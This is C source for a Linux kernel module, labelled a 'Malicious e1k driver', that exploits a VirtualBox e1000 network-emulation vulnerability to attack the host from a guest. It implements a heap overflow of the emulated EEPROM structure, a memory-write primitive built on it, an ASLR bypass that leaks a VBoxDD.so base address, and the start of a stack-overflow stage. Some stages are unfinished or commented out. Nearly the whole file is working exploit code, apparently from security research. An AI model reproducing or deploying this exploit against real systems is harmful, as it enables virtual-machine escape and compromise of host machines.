/* Fake e1000 Driver code.
 *
 * Exploit of an e1000 emulation vulnerability found by Sergey Zelenyuk,
 * described here https://github.com/MorteNoir1/virtualbox_e1000_0day.
 * 
 */

#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/delay.h>
#include <asm/io.h>

#include "e1k_utils.h"

MODULE_AUTHOR("ndureiss & Choch");
MODULE_DESCRIPTION("Malicious e1k driver");
MODULE_SUPPORTED_DEVICE("none");
MODULE_LICENSE("TLS-SEC");

#define NB_MAX_DESC 256
#define LEAKED_VBOXDD_VAO 0x330D2E

/* ========================== METHOD DECLARATION ========================== */
static int __init e1k_init(void);
static void __exit e1k_exit(void);
static uint8_t* map_mmio(void);
static void e1k_configure(void);
static void heap_overflow(uint16_t new_addr);
static void write_primitive(uint16_t address, uint16_t value);
static uint64_t aslr_bypass(void);
static void stack_overflow(void);
static void nx_bypass(void);

/* ==================== GLOBAL VARIABLES DECLARATION ====================== */
uint8_t* bar0, tx_buffer;
struct e1000_desc* tx_ring;
static int	idx = 0;
uint16_t mu16Data[64] =
{	0x0008, 0x1527, 0x2049, 0x0000, 0xffff, 0x0000, 0x0000, 0x0000,
	0x0000, 0x0000, 0x4408, 0x001e, 0x8086, 0x100e, 0x8086, 0x3040,
	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
	0x0000, 0x7061, 0x280c, 0x00c8, 0x00c8, 0x0000, 0x0000, 0x0000,
	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0602,
	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000,
	0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x0000, 0x5fc4
};

/* ================================== CORE ================================ */
/* ------------------------------ Constructor ----------------------------- */
static int __init e1k_init(void)
{
	bar0 = map_mmio();
	if (!bar0) {
		pr_info("e1k : failed to map mmio");
		return -1;
	}
	e1k_configure();
	//aslr_bypass();
	//nx_bypass();
	
	pr_info("Pwnd");
	return 0;
}
module_init(e1k_init);

/* ------------------------------- Destructor ----------------------------- */
static void __exit e1k_exit(void)
{
	pr_info("Bye Bye");
}
module_exit(e1k_exit);

/* ---------------------------- Useful functions -------------------------- */

/** map_mmio : get virtual address mapped to device physical address
 * @return virtual address of 0xF0000000
 */
static uint8_t* map_mmio(void)
{
	off_t phys_addr = 0xF0000000;
	size_t length = 0x20000;

	uint8_t* virt_addr = ioremap(phys_addr, length);
	if (!virt_addr) {
		pr_info("e1k : ioremap failed to map MMIO\n");
		return NULL;
	}

	return virt_addr;
}

/** e1k_configure : configure network device (e1000) registers */
static void e1k_configure(void)
{
	// Configure general purpose registers
	uint32_t ctrl, tctl, tdlen;
	uint64_t tdba;
	int i;

	ctrl = get_register(CTRL) | CTRL_RST;
	set_register(CTRL, ctrl);

	ctrl = get_register(CTRL) | CTRL_ASDE | CTRL_SLU;
	set_register(CTRL, ctrl);

	// Configure TX registers 
	tx_ring = kmalloc(DESC_SIZE * NB_MAX_DESC, GFP_KERNEL);
	if (!tx_ring) {
		pr_info("e1k : failed to allocate TX Ring\n");
		return;
	}
	// Transmit setup
	for (i = 0; i < NB_MAX_DESC; ++i) {
		tx_ring[i].context.cmd_and_length = DESC_DONE;
	}

	tx_buffer = kmalloc(PAYLOAD_LEN, GFP_KERNEL);
	if (!tx_buffer) {
		pr_info("e1k : failed to allocate TX Buffer\n");
		return;
	}
	// Payload setup
	for (i = 0; i < PAYLOAD_LEN-(0x32); ++i) {
		tx_buffer[i] = 0x61; // Fill with garbage "a"
	}

	tdba = (uint64_t)((uintptr_t) virt_to_phys(tx_ring));
	set_register(TDBAL, (uint32_t) ((tdba & 0xFFFFFFFFULL)));
	pr_info("¯\\_(ツ)_/¯");
	set_register(TDBAH, (uint32_t) (tdba >> 32));

	tdlen = DESC_SIZE * NB_MAX_DESC;
	set_register(TDLEN, tdlen);

	set_register(TDT, 0);
	set_register(TDH, 0);

	tctl = get_register(TCTL) | TCTL_EN | TCTL_PSP | ((0x40 << 12) & TCTL_COLD) | ((0x10 << 8) & TCTL_CT) | TCTL_RTLC;
	set_register(TCTL, tctl);
}

/** heap_overflow : erase EEPROM writing address with new one
 * @param new_addr new adress to write in EEPROM
 */
static void heap_overflow(uint16_t new_addr)
{
	uint32_t	tdt;
	uint64_t 	physical_address;

	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].context);
	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
	struct e1000_data_desc*	data_3 = &(tx_ring[idx+2].data);
	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].context);
	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);

	//------------- Payload setup -------------//
	
	/* We will overflow on EEProm Struct. Looks like 
	 *		...
	 *		- uint16_t	m_au16Data[64]		(1024 bits)
	 * 		- enum		m_eState			(32 bits)
	 *		- bool		m_fWriteEnabled		(08 bits)
	 * 		- uint8_t 	Alignment1			(08 bits)
	 *		- uint16_t	m_u16Word			(16 bits)
	 *		- uint16_t	m_u16Mask			(16 bits)
	 *		- uint16_t	m_u16Addr			(16 bits)
	 * 		... 
	 */
	memcpy(&(tx_buffer[PAYLOAD_LEN - 140]), mu16Data, 128);
	tx_buffer[PAYLOAD_LEN - 12]	= 0x01;
	tx_buffer[PAYLOAD_LEN - 11]	= 0x00;
	tx_buffer[PAYLOAD_LEN - 10]	= 0x00;
	tx_buffer[PAYLOAD_LEN - 9]	= 0x00;
	tx_buffer[PAYLOAD_LEN - 8]	= 0x01;
	tx_buffer[PAYLOAD_LEN - 4]	= low16((1 << 15));
	tx_buffer[PAYLOAD_LEN - 3]	= high16((1 << 15));
	tx_buffer[PAYLOAD_LEN - 2]	= low16(new_addr);
	tx_buffer[PAYLOAD_LEN - 1]	= high16(new_addr);
	//-----------------------------------------//

	//----------- Descriptors setup -----------//
	physical_address = virt_to_phys(tx_buffer);

	ctxt_1->lower_setup.ip_config	= (uint32_t) 0;
	ctxt_1->upper_setup.tcp_config	= (uint32_t) 0;
	ctxt_1->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
	ctxt_1->tcp_seg_setup.data		= (uint32_t) (MSS_DEFAULT);

	data_2->buffer_addr				= (uint64_t) physical_address;
	data_2->lower.data				= (uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
	data_2->upper.data				= (uint32_t) 0;

	data_3->buffer_addr				= (uint64_t) physical_address;
	data_3->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
	data_3->upper.data				= (uint32_t) 0;

	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | PAYLOAD_LEN);
	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));

	data_5->buffer_addr				= (uint64_t) physical_address;
	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | PAYLOAD_LEN | TSE);
	data_5->upper.data				= (uint32_t) 0;
	//-----------------------------------------//

	//--------- Fetch new descriptors ---------//
	idx += 5;
	tdt = (get_register(TDT) + 5) & 0xFFFF;
	set_register(TDT, tdt);
	//-----------------------------------------//
}

/** wait_access : wait access of EEPROM */
void wait_access(void)
{
	uint32_t eecd;

	eecd = get_register(EECD) | EECD_REQ | EECD_FWE_EN;
	set_register(EECD, eecd);

	while (!(get_register(EECD) & EECD_GNT)) {
		udelay(5);
	}
}

/** emul_clock : emulate the EEPROM clock
 * @param *eecd		EEPROM control data register pointer 
 */
void emul_clock(uint32_t * eecd)
{	
	*eecd = *eecd | EECD_SK;
	set_register(EECD, *eecd);
	udelay(50);

	*eecd = *eecd & ~EECD_SK;
	set_register(EECD, *eecd);
	udelay(50);
}

/** write_primitive : write 2-bytes thanks EEPROM structure overflow, using
 * legit operation : m_au16Data[u32Addr] = u16Value.
 * @param address	adress where we want to write
 * @param value		value we want to write
 */
static void write_primitive(uint16_t address, uint16_t value)
{
	int i;
	uint16_t mask;
	uint32_t eecd;

	// 0. Wait to access the EEPROM
	wait_access();

	// 1. Return in STANDBY state
	eecd = get_register(EECD) & ~(EECD_CS | EECD_SK | EECD_DI | EECD_DO);
	set_register(EECD, eecd);
	
	// 2. Go into READING_DI state (Decode mode)
	wait_access();
	eecd = get_register(EECD) | EECD_CS | EECD_SK;
	set_register(EECD, eecd);
	udelay(50);
	
	emul_clock(&eecd);
	
	eecd = get_register(EECD) | EECD_SK | EECD_DI;
	set_register(EECD, eecd);
	udelay(50);

	emul_clock(&eecd);

	// 3. Stay into READING_DI state to switching into "Write mode"
	mask = (1 << 7);
	for (i = 0; i < 8; i++) {
		eecd = get_register(EECD) & ~EECD_DI;

		if ((1 << 6) & mask)
			eecd |= EECD_DI;

		set_register(EECD, eecd);
		udelay(50);

		emul_clock(&eecd);
		mask >>= 1;
	}

	// 4. Overflow EEPROM writing address
	heap_overflow(address);
	mdelay(3000);
	
	// 5. Write value thanks to legit operation into our overflowed address.
	mask = 1 << 15;
	for (i = 0; i < 16; i++) {
		eecd = get_register(EECD) & ~EECD_DI;

		if (value & mask)
			eecd |= EECD_DI;

		set_register(EECD, eecd);
		udelay(50);

		emul_clock(&eecd);
		mask >>= 1;
	}

	// 6. We leave the "DI" bit set to "0" when we leave this routine.
	eecd = get_register(EECD) & ~(EECD_DI | EECD_CS);
	set_register(EECD, eecd);

	emul_clock(&eecd);

	eecd = get_register(EECD) & ~EECD_REQ;
	set_register(EECD, eecd);
}

static uint64_t aslr_bypass(void)
{
	uint8_t leaked_bytes[8];
	uint32_t rctl, i;
	uint64_t leaked_vboxdd_ptr, vboxdd_base;

	pr_info("##### Stage 1 #####\n");

	// Set no loopback mode
	rctl = get_register(RCTL) | RCTL_LBM_NO;
	set_register(RCTL, rctl);

	for (i = 0; i < 8; i++) {
		write_primitive(0x266f, 0x0058 + 0x2A + 0x8 + i);
		leaked_bytes[i] = inb(0x4107);

		pr_info("Byte %d leaked: 0x%02X\n", i, leaked_bytes[i]);
	}

	leaked_vboxdd_ptr	= *((uint64_t *) leaked_bytes);
	vboxdd_base			= leaked_vboxdd_ptr - LEAKED_VBOXDD_VAO;
	pr_info("Leaked VBoxDD.so pointer : 0x%016llx\n", leaked_vboxdd_ptr);
	pr_info("Leaked VBoxDD.so base : 0x%016llx\n", vboxdd_base);

	return vboxdd_base;
}

static void stack_overflow(void)
{
	uint8_t* 	buffer;
	uint32_t	tdt;
	uint64_t 	physical_address;

	struct e1000_ctxt_desc*	ctxt_1 = &(tx_ring[idx+0].context);
	struct e1000_data_desc*	data_2 = &(tx_ring[idx+1].data);
	struct e1000_data_desc*	data_3 = &(tx_ring[idx+2].data);
	struct e1000_ctxt_desc*	ctxt_4 = &(tx_ring[idx+3].context);
	struct e1000_data_desc*	data_5 = &(tx_ring[idx+4].data);

	//------------- Payload setup -------------//
	buffer = kmalloc(STACK_LEN, GFP_KERNEL);

	buffer[STACK_LEN - 8] = 0x61;
	buffer[STACK_LEN - 7] = 0x61;
	buffer[STACK_LEN - 6] = 0x61;
	buffer[STACK_LEN - 5] = 0x61;
	buffer[STACK_LEN - 4] = 0x61;
	buffer[STACK_LEN - 3] = 0x61;
	buffer[STACK_LEN - 2] = 0x61;
	buffer[STACK_LEN - 1] = 0x61;
	//-----------------------------------------//

	//----------- Descriptors setup -----------//
	
	physical_address = virt_to_phys(buffer);

	ctxt_1->lower_setup.ip_config	= (uint32_t) 0;
	ctxt_1->upper_setup.tcp_config	= (uint32_t) 0;
	ctxt_1->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | FIRST_PAYLEN);
	ctxt_1->tcp_seg_setup.data		= (uint32_t) (MSS_DEFAULT);

	data_2->buffer_addr				= (uint64_t) physical_address;
	data_2->lower.data				= (uint32_t) (REPORT_STATUS | DESC_DATA | 0x10 | TSE);
	data_2->upper.data				= (uint32_t) 0;

	data_3->buffer_addr				= (uint64_t) physical_address;
	data_3->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | TSE);
	data_3->upper.data				= (uint32_t) 0;

	ctxt_4->lower_setup.ip_config	= (uint32_t) 0;
	ctxt_4->upper_setup.tcp_config	= (uint32_t) 0;
	ctxt_4->cmd_and_length			= (uint32_t) (TCP_IP | REPORT_STATUS | DESC_CTX | TSE | STACK_LEN);
	ctxt_4->tcp_seg_setup.data		= (uint32_t) ((0xF << 16));

	data_5->buffer_addr				= (uint64_t) physical_address;
	data_5->lower.data				= (uint32_t) (EOP | REPORT_STATUS | DESC_DATA | STACK_LEN | TSE);
	data_5->upper.data				= (uint32_t) 0;
	//-----------------------------------------//

	//--------- Fetch new descriptors ---------//
	idx += 5;
	tdt = (get_register(TDT) + 5) & 0xFFFF;
	set_register(TDT, tdt);
	//-----------------------------------------//
}

static void nx_bypass(void)
{
	uint32_t rctl;
	pr_info("##### Stage 2 #####\n");

	// Set loopback mode
	rctl = get_register(RCTL);// | RCTL_LBM_MAC | RCTL_LBM_SLP;
	set_register(RCTL, rctl);

	//stack_overflow();

	// Disable loopback mode
	rctl = get_register(RCTL);// & ~RCTL_LBM_MAC & ~RCTL_LBM_SLP;
	set_register(RCTL, rctl);
}
